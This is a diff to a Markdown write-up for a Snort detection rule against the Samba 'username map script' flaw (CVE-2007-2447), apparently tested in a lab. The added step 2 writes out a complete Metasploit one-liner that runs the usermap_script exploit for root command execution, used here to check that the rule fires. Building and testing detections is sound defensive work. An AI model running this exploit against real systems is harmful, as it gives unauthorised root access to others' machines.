@@ -5,8 +5,11 @@
 ## 1. Executive Summary
 
 **Vulnerability:** CVE-2007-2447 (Samba "Username Map Script" Command Execution)
+
 **Severity:** Critical (CVSS 9.0)
+
 **Rule ID:** `SID:1000003`
+
 **Status:** ✅ Verified (Lab Tested)
 
 This detection module targets the exploitation of the `username map script` option in Samba 3.0.20. Attackers exploit this by injecting shell metacharacters (specifically backticks or shell pipe operators) into the username field during the SMB Session Setup phase. This allows arbitrary command execution as `root` without authentication.
@@ -47,12 +50,20 @@ stream_tcp = { }
 ips = { enable_builtin_rules = true }
 ```
 
-### C. Execution Command
-Run Snort in alert mode, pointing to your new rule and config.
+### C. Execution & Verification
+
+**Step 1:** Start the Defender (Snort) Run Snort in alert mode. Note: Replace tun0 with your active network interface (e.g., eth0).
+
+Bash
+
+```sudo snort -c minimal.lua -R samba.rules -i tun0 -A alert_fast -k none```
+
+**Step 2:** Fire the Red Team Trigger (Metasploit) In a separate terminal, execute the attack to verify the rule catches it.
 
 ```
-sudo snort -c minimal.lua -R samba.rules -i tun0 -A alert_fast -k none
+msfconsole -q -x "use exploit/multi/samba/usermap_script; set RHOSTS <Target_IP>; set LHOST tun0; exploit"
 ```
+---
 
 ## 4. Evidence & Proof of Work
 
